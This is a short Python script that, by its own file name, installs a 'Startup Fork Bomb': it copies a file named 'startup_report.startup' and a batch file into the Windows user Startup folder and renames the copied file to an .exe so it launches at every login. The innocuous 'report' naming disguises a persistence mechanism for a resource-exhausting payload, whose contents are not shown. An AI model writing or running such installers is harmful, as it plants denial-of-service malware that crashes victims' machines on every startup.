import os, shutil, glob

dir_path = os.path.dirname(os.path.realpath('Startup Fork Bomb Installer.exe'))
startup = (os.path.expandvars("%USERPROFILE%\\Start Menu\\Programs\\Startup\\"))

os.chdir(dir_path)
shutil.copy('startup_report.startup', startup)
shutil.copy('run_startup_report.bat', startup)

os.chdir(os.path.expandvars("%USERPROFILE%\\Start Menu\\Programs\\Startup\\"))

for files in os.path.expandvars("%USERPROFILE%\\Start Menu\\Programs\\Startup\\"):
    for a_file in glob.glob("*.startup"):
        base = os.path.splitext(a_file)[0]
        os.rename(a_file, base + ".exe")
